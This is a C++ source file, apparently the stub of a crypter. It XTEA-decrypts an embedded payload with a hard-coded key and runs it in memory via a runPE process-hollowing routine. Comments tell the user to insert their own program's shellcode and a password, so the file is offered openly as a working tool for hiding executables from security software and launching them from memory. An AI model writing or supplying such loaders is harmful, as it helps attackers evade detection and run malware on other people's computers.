#include <Windows.h>
#include "runPE.h"
#include "shellcode.h" /*load up your programs shellcode*/
#include <stdint.h>

unsigned int key[4]={0xACB6,0x1344,0xEC90,0x285C};  /* Chose a password in hex   */
#define BLOCK_SIZE 8                               /* Make sure you change both */
                                                  /* xtea.cpp and stub.cpp     */

void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){
     unsigned int i;
     uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
     for (i=0; i < num_rounds; i++){
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
     }
     v[0]=v0; v[1]=v1;
}

int main(){
    unsigned char shellcode_decrypted[size]; //Make a slot for your shellcode

    int n_blocks=size/BLOCK_SIZE;
    if(size%BLOCK_SIZE!=0)              //pad the shellcode
        ++n_blocks;

    unsigned char data[BLOCK_SIZE];

    for(int i=0;i<n_blocks;i++){
        memcpy ( &data, &shellcode[i*BLOCK_SIZE], BLOCK_SIZE ); //copy the shellcode into the data buffer
        decipher(32,(uint32_t*)data,key); //de-xtea it

        for(int j=0;j<BLOCK_SIZE;j++)
            memcpy ( &shellcode_decrypted[(i*BLOCK_SIZE)+j],&data[j], sizeof(unsigned char));

        memset(data,0,BLOCK_SIZE);
      }

  runPE rp;

	TCHAR szFilePath[1024];
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);

	rp.run(LPSTR(szFilePath), shellcode_decrypted); //execute the shell code in memory
	return 0;
}
